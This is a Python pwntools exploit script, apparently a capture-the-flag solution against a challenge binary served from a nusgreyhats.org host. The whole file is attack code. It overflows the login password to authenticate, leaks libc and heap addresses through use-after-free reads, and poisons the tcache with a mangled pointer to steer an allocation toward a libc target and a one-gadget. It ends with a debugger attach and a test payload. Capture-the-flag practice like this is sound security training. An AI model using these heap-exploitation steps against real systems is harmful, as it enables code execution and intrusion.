from pwn import *

elf = context.binary = ELF("chal")
libc = elf.libc
if args.REMOTE:
	p = remote("ico-secret-agent-portal.nusgreyhats.org", 80)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)
rud = lambda a: p.recvuntil(a, drop=True)

# buffer overflow to authenticate
sla(b"Username: ", b"agent")
sa(b"Password: ", b"A\x00" + b"A"*47)

def create(sz, buf):
    sla(b"choice: ", b"1")
    sla(b"size:", str(sz).encode())
    sla(b"content:", buf)

def edit(idx, buf):
    sla(b"choice: ", b"2")
    sla(b"):", str(idx).encode())
    ru(b"content:")
    sla(b"content:", buf)

def read(idx):
    sla(b"choice: ", b"3")
    sla(b"):", str(idx).encode())
    ru(b"\xe2\x95\x90\n\x1b[97m")
    return rud(b"\x1b[92m")

def delete(idx):
    sla(b"choice: ", b"4")
    sla(b"):", str(idx).encode())

create(0x100, b"c")
create(0x800, b"a")
create(0x100, b"b")
delete(1)
libc.address = unpack(read(1)[:-1], "all") - 2206944
log.info(f'libc base @ {hex(libc.address)}')
delete(2)
heap_mangle = unpack(read(2)[:-1], "all")
print(hex(heap_mangle))

delete(0)
edit(0, p64((2203672-8+libc.address)^ heap_mangle))
gadgets = 965765
create(0x100, b"d")
# create(0x100, cyclic(48,n=8) + p64(libc.address + 1705728) + cyclic(0x50, n=8) + p64(libc.address + gadgets))
gdb.attach(p)
create(0x100, cyclic(0x100))


p.interactive()
